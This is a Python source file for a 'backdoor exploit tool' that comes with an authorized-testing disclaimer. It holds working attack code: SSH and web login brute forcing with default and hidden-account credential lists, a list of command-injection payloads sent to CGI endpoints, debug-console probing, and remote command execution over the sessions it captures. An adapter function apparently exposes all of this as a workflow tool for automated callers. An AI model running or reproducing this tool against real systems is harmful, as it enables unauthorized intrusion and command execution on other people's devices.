#!/usr/bin/env python3

"""
Backdoor Exploit Tool Module

This module provides functionality to exploit common backdoor vulnerabilities
in network devices and systems. It includes both real implementation and mock
functionality for testing purposes.

WARNING: This tool is for authorized security testing only. Use responsibly
and only against systems you have permission to test.
"""

import os
import sys
import json
import time
import random
import logging
import ipaddress
from typing import Any, Dict, List, Optional, Tuple, Union
from enum import Enum

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("backdoor_exploit")

# Try to import optional dependencies
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False
    logger.warning("Paramiko not available. SSH-based exploits will use mock implementation.")

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    logger.warning("Requests not available. HTTP-based exploits will use mock implementation.")

# Define backdoor types
class BackdoorType(Enum):
    DEFAULT_CREDENTIAL = "default_credential"
    HARDCODED_PASSWORD = "hardcoded_password"
    COMMAND_INJECTION = "command_injection"
    HIDDEN_ACCOUNT = "hidden_account"
    DEBUG_INTERFACE = "debug_interface"
    MAINTENANCE_HOOK = "maintenance_hook"
    DEVELOPER_BACKDOOR = "developer_backdoor"
    FIRMWARE_BACKDOOR = "firmware_backdoor"
    

# Define common vulnerabilities by vendor
KNOWN_BACKDOORS = {
    "generic": {
        "default_credentials": [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "root", "password": "root"},
            {"username": "user", "password": "user"},
        ],
        "command_injection_patterns": [
            {"url_path": "/diagnostics.cgi", "param": "cmd", "method": "GET"},
            {"url_path": "/cgi-bin/execute", "param": "command", "method": "POST"},
        ]
    },
    "vendor_x": {
        "default_credentials": [
            {"username": "admin", "password": "vendor_x_default"},
            {"username": "service", "password": "service123"},
        ],
        "hidden_accounts": [
            {"username": "backdoor", "password": "backdoor123"},
            {"username": "maintenance", "password": "xmaint2023"},
        ],
        "debug_interfaces": [
            {"port": 8080, "url_path": "/debug/console"},
            {"port": 9000, "url_path": "/maintenance/terminal"},
        ]
    },
    "vendor_y": {
        "default_credentials": [
            {"username": "admin", "password": "y_admin_default"},
        ],
        "command_injection_patterns": [
            {"url_path": "/admin/tools/ping.php", "param": "target", "method": "POST"},
        ],
        "maintenance_hooks": [
            {"port": 22, "magic_string": "MAINTENANCE_MODE_Y2023"},
        ]
    }
}

# Exploitation outcomes
class ExploitResult:
    def __init__(
        self, 
        success: bool, 
        backdoor_type: Optional[str] = None,
        access_gained: bool = False,
        command_execution: bool = False,
        message: str = "",
        session_id: Optional[str] = None,
        details: Optional[Dict] = None
    ):
        self.success = success
        self.backdoor_type = backdoor_type
        self.access_gained = access_gained
        self.command_execution = command_execution
        self.message = message
        self.session_id = session_id
        self.details = details or {}
        self.timestamp = time.time()
    
    def to_dict(self) -> Dict:
        """Convert result to dictionary format"""
        return {
            "success": self.success,
            "backdoor_type": self.backdoor_type,
            "access_gained": self.access_gained,
            "command_execution": self.command_execution,
            "message": self.message,
            "session_id": self.session_id,
            "details": self.details,
            "timestamp": self.timestamp
        }


class BackdoorExploiter:
    """Class for exploiting backdoors in network devices and systems"""
    
    def __init__(self, target: str, port: Optional[int] = None, vendor: Optional[str] = "generic"):
        """
        Initialize the backdoor exploiter
        
        Args:
            target: IP address or hostname of the target
            port: Port number (optional, depends on exploit)
            vendor: Target vendor name (for vendor-specific exploits)
        """
        self.target = target
        self.port = port
        self.vendor = vendor.lower() if vendor else "generic"
        self.sessions = {}
        
        # Validate target
        try:
            if self.target.count('.') == 3:  # Looks like IPv4
                ipaddress.IPv4Address(self.target)
            elif ':' in self.target:  # Looks like IPv6
                ipaddress.IPv6Address(self.target)
            # Otherwise, assume it's a hostname
        except ValueError:
            logger.warning(f"Target {self.target} is not a valid IP address. Assuming hostname.")
    
    def _generate_session_id(self) -> str:
        """Generate a unique session ID for tracking exploit sessions"""
        import uuid
        return str(uuid.uuid4())
    
    def try_default_credentials(self, service_type: str = "ssh", custom_credentials: Optional[List[Dict]] = None) -> ExploitResult:
        """
        Try default credentials against a target service
        
        Args:
            service_type: Type of service (ssh, http, telnet)
            custom_credentials: List of custom credential dicts to try
            
        Returns:
            ExploitResult: Result of the exploitation attempt
        """
        logger.info(f"Attempting default credential exploit against {self.target} ({service_type})")
        
        # Use provided credentials or get from known backdoors database
        credentials_to_try = custom_credentials or []
        if not credentials_to_try:
            # Get generic defaults first
            credentials_to_try.extend(KNOWN_BACKDOORS["generic"]["default_credentials"])
            
            # Add vendor-specific if available
            if self.vendor in KNOWN_BACKDOORS and "default_credentials" in KNOWN_BACKDOORS[self.vendor]:
                credentials_to_try.extend(KNOWN_BACKDOORS[self.vendor]["default_credentials"])
        
        if service_type == "ssh" and PARAMIKO_AVAILABLE:
            return self._try_ssh_credentials(credentials_to_try)
        elif service_type == "http" and REQUESTS_AVAILABLE:
            return self._try_http_credentials(credentials_to_try)
        else:
            # Fall back to mock implementation
            return self._mock_try_credentials(service_type, credentials_to_try)
    
    def _try_ssh_credentials(self, credentials: List[Dict]) -> ExploitResult:
        """Try SSH credentials using Paramiko"""
        if not PARAMIKO_AVAILABLE:
            return self._mock_try_credentials("ssh", credentials)
        
        port = self.port or 22
        
        for cred in credentials:
            username = cred.get("username")
            password = cred.get("password")
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    self.target, 
                    port=port,
                    username=username,
                    password=password,
                    timeout=5
                )
                
                # Test command execution
                stdin, stdout, stderr = client.exec_command("id")
                output = stdout.read().decode()
                
                session_id = self._generate_session_id()
                self.sessions[session_id] = client
                
                return ExploitResult(
                    success=True,
                    backdoor_type=BackdoorType.DEFAULT_CREDENTIAL.value,
                    access_gained=True,
                    command_execution=True,
                    message=f"Successfully authenticated to {self.target}:{port} using {username}:{password}",
                    session_id=session_id,
                    details={
                        "username": username,
                        "target": self.target,
                        "port": port,
                        "command_output": output
                    }
                )
            
            except paramiko.AuthenticationException:
                logger.debug(f"Authentication failed for {username}:{password}")
                continue
            except (paramiko.SSHException, TimeoutError, ConnectionRefusedError) as e:
                logger.debug(f"Connection error: {str(e)}")
                continue
        
        return ExploitResult(
            success=False,
            backdoor_type=BackdoorType.DEFAULT_CREDENTIAL.value,
            message=f"No default credentials worked for {self.target}:{port}"
        )
    
    def _try_http_credentials(self, credentials: List[Dict]) -> ExploitResult:
        """Try HTTP credentials against a web interface"""
        if not REQUESTS_AVAILABLE:
            return self._mock_try_credentials("http", credentials)
        
        port = self.port or 80
        protocol = "https" if port == 443 else "http"
        base_url = f"{protocol}://{self.target}:{port}"
        
        # Common login paths to try
        login_paths = [
            "/login", 
            "/admin", 
            "/admin/login", 
            "/manager/html",
            "/cgi-bin/login",
            "/web/login.html"
        ]
        
        for path in login_paths:
            login_url = f"{base_url}{path}"
            
            try:
                # Check if page exists
                response = requests.get(login_url, verify=False, timeout=5)
                if response.status_code >= 400:
                    continue
                
                for cred in credentials:
                    username = cred.get("username")
                    password = cred.get("password")
                    
                    # Try a POST request with credentials
                    data = {
                        "username": username,
                        "password": password,
                        "login": "Login",
                        "submit": "Submit"
                    }
                    
                    response = requests.post(
                        login_url, 
                        data=data, 
                        allow_redirects=True, 
                        verify=False,
                        timeout=5
                    )
                    
                    # Check for successful login indicators
                    success_indicators = [
                        "logout" in response.text.lower(),
                        "welcome" in response.text.lower(),
                        "dashboard" in response.text.lower(),
                        response.status_code == 200 and response.url != login_url,
                        "admin" in response.text.lower() and "login" not in response.text.lower()
                    ]
                    
                    if any(success_indicators):
                        session_id = self._generate_session_id()
                        self.sessions[session_id] = response.cookies
                        
                        return ExploitResult(
                            success=True,
                            backdoor_type=BackdoorType.DEFAULT_CREDENTIAL.value,
                            access_gained=True,
                            command_execution=False,  # Web interfaces may not give direct command execution
                            message=f"Successfully authenticated to {login_url} using {username}:{password}",
                            session_id=session_id,
                            details={
                                "username": username,
                                "url": login_url,
                                "response_code": response.status_code
                            }
                        )
            
            except requests.RequestException as e:
                logger.debug(f"HTTP request failed: {str(e)}")
                continue
        
        return ExploitResult(
            success=False,
            backdoor_type=BackdoorType.DEFAULT_CREDENTIAL.value,
            message=f"No default web credentials worked for {base_url}"
        )
    
    def try_command_injection(self, command: str = "id") -> ExploitResult:
        """
        Try command injection vulnerabilities
        
        Args:
            command: Command to inject (default: 'id')
            
        Returns:
            ExploitResult: Result of the exploitation attempt
        """
        logger.info(f"Attempting command injection exploit against {self.target}")
        
        if not REQUESTS_AVAILABLE:
            return self._mock_command_injection(command)
        
        # Get injection patterns to try
        patterns = KNOWN_BACKDOORS["generic"]["command_injection_patterns"]
        if self.vendor in KNOWN_BACKDOORS and "command_injection_patterns" in KNOWN_BACKDOORS[self.vendor]:
            patterns.extend(KNOWN_BACKDOORS[self.vendor]["command_injection_patterns"])
        
        port = self.port or 80
        protocol = "https" if port == 443 else "http"
        base_url = f"{protocol}://{self.target}:{port}"
        
        # Command injection payloads to try
        payloads = [
            command,
            f";{command}",
            f"&{command}",
            f"&&{command}",
            f"|{command}",
            f"||{command}",
            f"`{command}`",
            f"$({command})",
            f"' ; {command} ; '",
            f"\" ; {command} ; \"",
        ]
        
        for pattern in patterns:
            url_path = pattern.get("url_path")
            param = pattern.get("param")
            method = pattern.get("method", "GET")
            
            for payload in payloads:
                try:
                    url = f"{base_url}{url_path}"
                    
                    if method.upper() == "GET":
                        response = requests.get(
                            url, 
                            params={param: payload}, 
                            verify=False,
                            timeout=10
                        )
                    else:  # POST
                        response = requests.post(
                            url, 
                            data={param: payload}, 
                            verify=False,
                            timeout=10
                        )
                    
                    # Look for command output indicators
                    if (
                        "uid=" in response.text or 
                        "gid=" in response.text or
                        "root:" in response.text or
                        "bash" in response.text
                    ):
                        return ExploitResult(
                            success=True,
                            backdoor_type=BackdoorType.COMMAND_INJECTION.value,
                            access_gained=True,
                            command_execution=True,
                            message=f"Command injection successful via {url_path}",
                            details={
                                "url": url,
                                "param": param,
                                "payload": payload,
                                "output": response.text[:500]  # Limit output size
                            }
                        )
                except requests.RequestException as e:
                    logger.debug(f"HTTP request failed: {str(e)}")
                    continue
        
        return ExploitResult(
            success=False,
            backdoor_type=BackdoorType.COMMAND_INJECTION.value,
            message=f"No command injection vulnerabilities found on {self.target}"
        )
    
    def try_hidden_account(self) -> ExploitResult:
        """
        Try to find and exploit hidden/undocumented accounts
        
        Returns:
            ExploitResult: Result of the exploitation attempt
        """
        logger.info(f"Attempting to find hidden accounts on {self.target}")
        
        # Check if we have vendor-specific hidden accounts to try
        if (
            self.vendor in KNOWN_BACKDOORS and 
            "hidden_accounts" in KNOWN_BACKDOORS[self.vendor]
        ):
            hidden_accounts = KNOWN_BACKDOORS[self.vendor]["hidden_accounts"]
            return self.try_default_credentials(custom_credentials=hidden_accounts)
        else:
            # Fall back to mock implementation for demonstration
            return self._mock_hidden_account()
    
    def try_debug_interface(self) -> ExploitResult:
        """
        Try to exploit debug interfaces
        
        Returns:
            ExploitResult: Result of the exploitation attempt
        """
        logger.info(f"Attempting to find debug interfaces on {self.target}")
        
        if not REQUESTS_AVAILABLE:
            return self._mock_debug_interface()
        
        # Check if we have vendor-specific debug interfaces to try
        debug_interfaces = []
        if (
            self.vendor in KNOWN_BACKDOORS and 
            "debug_interfaces" in KNOWN_BACKDOORS[self.vendor]
        ):
            debug_interfaces = KNOWN_BACKDOORS[self.vendor]["debug_interfaces"]
        
        for interface in debug_interfaces:
            port = interface.get("port", 80)
            url_path = interface.get("url_path", "/debug")
            
            protocol = "https" if port == 443 else "http"
            url = f"{protocol}://{self.target}:{port}{url_path}"
            
            try:
                response = requests.get(url, verify=False, timeout=5)
                
                if response.status_code == 200:
                    # Look for debug interface indicators
                    indicators = [
                        "debug" in response.text.lower(),
                        "console" in response.text.lower(),
                        "terminal" in response.text.lower(),
                        "command" in response.text.lower()
                    ]
                    
                    if any(indicators):
                        return ExploitResult(
                            success=True,
                            backdoor_type=BackdoorType.DEBUG_INTERFACE.value,
                            access_gained=True,
                            command_execution=True,
                            message=f"Debug interface found at {url}",
                            details={
                                "url": url,
                                "response_size": len(response.text),
                                "indicators": [ind for ind in ["debug", "console", "terminal", "command"] 
                                               if ind in response.text.lower()]
                            }
                        )
            except requests.RequestException:
                continue
        
        return ExploitResult(
            success=False,
            backdoor_type=BackdoorType.DEBUG_INTERFACE.value,
            message=f"No debug interfaces found on {self.target}"
        )
    
    def execute_command(self, session_id: str, command: str) -> Dict:
        """
        Execute a command using an established session
        
        Args:
            session_id: Session ID from a successful exploit
            command: Command to execute
            
        Returns:
            Dict: Command execution results
        """
        if session_id not in self.sessions:
            return {
                "success": False,
                "error": "Invalid or expired session ID"
            }
        
        session = self.sessions[session_id]
        
        # Handle SSH sessions
        if isinstance(session, paramiko.SSHClient):
            try:
                stdin, stdout, stderr = session.exec_command(command)
                output = stdout.read().decode()
                error = stderr.read().decode()
                
                return {
                    "success": True,
                    "output": output,
                    "error": error
                }
            except Exception as e:
                return {
                    "success": False,
                    "error": str(e)
                }
        
        # For HTTP sessions or others, provide meaningful response
        return {
            "success": False,
            "error": "Command execution not supported for this session type"
        }
    
    def close_session(self, session_id: str) -> bool:
        """
        Close an active session
        
        Args:
            session_id: Session ID to close
            
        Returns:
            bool: True if session was closed successfully
        """
        if session_id not in self.sessions:
            return False
        
        session = self.sessions[session_id]
        
        # Handle SSH sessions
        if isinstance(session, paramiko.SSHClient):
            try:
                session.close()
                del self.sessions[session_id]
                return True
            except Exception:
                return False
        
        # For other session types
        try:
            del self.sessions[session_id]
            return True
        except Exception:
            return False
    
    def close_all_sessions(self) -> int:
        """
        Close all active sessions
        
        Returns:
            int: Number of sessions closed
        """
        count = 0
        session_ids = list(self.sessions.keys())
        
        for session_id in session_ids:
            if self.close_session(session_id):
                count += 1
        
        return count
    
    # Mock implementations for testing or when dependencies are missing
    
    def _mock_try_credentials(self, service_type: str, credentials: List[Dict]) -> ExploitResult:
        """Mock implementation of credential testing"""
        logger.info(f"[MOCK] Trying credentials against {self.target} ({service_type})")
        
        # Simulate a small delay
        time.sleep(random.uniform(0.5, 2.0))
        
        # Simulate success with 10% probability
        if random.random() < 0.1 and credentials:
            # Randomly pick a credential
            cred = random.choice(credentials)
            username = cred.get("username")
            
            session_id = self._generate_session_id()
            self.sessions[session_id] = {"type": "mock", "service": service_type}
            
            return ExploitResult(
                success=True,
                backdoor_type=BackdoorType.DEFAULT_CREDENTIAL.value,
                access_gained=True,
                command_execution=service_type == "ssh",
                message=f"[MOCK] Successfully authenticated to {self.target} using {username}",
                session_id=session_id,
                details={
                    "username": username,
                    "target": self.target,
                    "mock": True
                }
            )
        
        return ExploitResult(
            success=False,
            backdoor_type=BackdoorType.DEFAULT_CREDENTIAL.value,
            message=f"[MOCK] No credentials worked for {self.target}"
        )
    
    def _mock_command_injection(self, command: str) -> ExploitResult:
        """Mock implementation of command injection"""
        logger.info(f"[MOCK] Trying command injection against {self.target}")
        
        # Simulate a small delay
        time.sleep(random.uniform(1.0, 3.0))
        
        # Simulate success with 5% probability
        if random.random() < 0.05:
            mock_output = f"uid=0(root) gid=0(root) groups=0(root)\nhostname: {self.target}"
            
            return ExploitResult(
                success=True,
                backdoor_type=BackdoorType.COMMAND_INJECTION.value,
                access_gained=True,
                command_execution=True,
                message=f"[MOCK] Command injection successful on {self.target}",
                details={
                    "url": f"http://{self.target}/vulnerable/path",
                    "param": "ping",
                    "payload": f";{command}",
                    "output": mock_output,
                    "mock": True
                }
            )
        
        return ExploitResult(
            success=False,
            backdoor_type=BackdoorType.COMMAND_INJECTION.value,
            message=f"[MOCK] No command injection vulnerabilities found on {self.target}"
        )
    
    def _mock_hidden_account(self) -> ExploitResult:
        """Mock implementation of hidden account discovery"""
        logger.info(f"[MOCK] Trying to find hidden accounts on {self.target}")
        
        # Simulate a small delay
        time.sleep(random.uniform(1.0, 2.0))
        
        # Simulate success with 10% probability
        if random.random() < 0.1:
            mock_account = {"username": "maintenance", "password": "backdoor123"}
            
            session_id = self._generate_session_id()
            self.sessions[session_id] = {"type": "mock", "service": "ssh"}
            
            return ExploitResult(
                success=True,
                backdoor_type=BackdoorType.HIDDEN_ACCOUNT.value,
                access_gained=True,
                command_execution=True,
                message=f"[MOCK] Hidden account found on {self.target}",
                session_id=session_id,
                details={
                    "username": mock_account["username"],
                    "target": self.target,
                    "mock": True
                }
            )
        
        return ExploitResult(
            success=False,
            backdoor_type=BackdoorType.HIDDEN_ACCOUNT.value,
            message=f"[MOCK] No hidden accounts found on {self.target}"
        )
    
    def _mock_debug_interface(self) -> ExploitResult:
        """Mock implementation of debug interface discovery"""
        logger.info(f"[MOCK] Trying to find debug interfaces on {self.target}")
        
        # Simulate a small delay
        time.sleep(random.uniform(0.5, 1.5))
        
        # Simulate success with 8% probability
        if random.random() < 0.08:
            mock_port = random.choice([8080, 9000, 10000])
            
            return ExploitResult(
                success=True,
                backdoor_type=BackdoorType.DEBUG_INTERFACE.value,
                access_gained=True,
                command_execution=True,
                message=f"[MOCK] Debug interface found on {self.target}:{mock_port}",
                details={
                    "url": f"http://{self.target}:{mock_port}/debug/console",
                    "indicators": ["debug", "console"],
                    "mock": True
                }
            )
        
        return ExploitResult(
            success=False,
            backdoor_type=BackdoorType.DEBUG_INTERFACE.value,
            message=f"[MOCK] No debug interfaces found on {self.target}"
        )


# Adapter function for workflow tool use
def exploit_backdoor(**kwargs) -> Dict:
    """
    Adapter function for backdoor exploitation that maps workflow JSON parameters
    to BackdoorExploiter methods.
    
    Args:
        target: Target IP or hostname
        port: Target port (optional)
        vendor: Target vendor (optional)
        exploit_type: Type of backdoor exploit to attempt
        service_type: Service type for credential attempts
        command: Command to execute for command injection
        session_id: Session ID for command execution
        
    Returns:
        Dict: Result of the exploitation attempt
    """
    # Extract and validate required parameters
    target = kwargs.get("target")
    if not target:
        return {
            "success": False,
            "error": "Target parameter is required"
        }
    
    # Extract optional parameters
    port = kwargs.get("port")
    if port and isinstance(port, str):
        try:
            port = int(port)
        except ValueError:
            port = None
    
    vendor = kwargs.get("vendor", "generic")
    exploit_type = kwargs.get("exploit_type", "default_credential")
    service_type = kwargs.get("service_type", "ssh")
    command = kwargs.get("command", "id")
    session_id = kwargs.get("session_id")
    
    # Initialize the backdoor exploiter
    exploiter = BackdoorExploiter(target, port, vendor)
    
    # Execute the requested exploit type
    if exploit_type == "default_credential":
        result = exploiter.try_default_credentials(service_type)
    elif exploit_type == "command_injection":
        result = exploiter.try_command_injection(command)
    elif exploit_type == "hidden_account":
        result = exploiter.try_hidden_account()
    elif exploit_type == "debug_interface":
        result = exploiter.try_debug_interface()
    elif exploit_type == "execute_command" and session_id:
        return exploiter.execute_command(session_id, command)
    elif exploit_type == "close_session" and session_id:
        success = exploiter.close_session(session_id)
        return {
            "success": success,
            "message": f"Session {'closed' if success else 'not found or could not be closed'}"
        }
    else:
        return {
            "success": False,
            "error": f"Unknown exploit type: {exploit_type}"
        }
    
    # Return the result as a dictionary
    return result.to_dict()


# Module usage example
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Backdoor exploitation tool")
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("--port", type=int, help="Target port")
    parser.add_argument("--vendor", default="generic", help="Target vendor")
    parser.add_argument("--type", default="default_credential", help="Exploit type")
    parser.add_argument("--service", default="ssh", help="Service type for credential exploits")
    parser.add_argument("--command", default="id", help="Command to execute")
    
    args = parser.parse_args()
    
    result = exploit_backdoor(
        target=args.target,
        port=args.port,
        vendor=args.vendor,
        exploit_type=args.type,
        service_type=args.service,
        command=args.command
    )
    
    print(json.dumps(result, indent=2))
